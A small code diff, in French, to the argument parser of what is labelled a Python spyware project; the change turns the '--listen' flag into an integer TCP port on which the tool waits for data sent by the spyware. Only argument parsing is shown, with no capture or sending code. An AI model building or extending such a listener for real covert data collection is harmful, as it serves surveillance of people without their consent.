@@ -16,7 +16,7 @@ TXT_GLOB = ""
 
 def argument():
     p = argparse.ArgumentParser(description='Projet Python - Spyware')
-    p.add_argument('-l', '--listen', action='store_true', help="se met en écoute sur le port TCP saisi par "
+    p.add_argument('-l', '--listen',type=int, help="se met en écoute sur le port TCP saisi par "
                                                                "l'utilisateur et attend les données du spyware UP")
 
     args = p.parse_args()
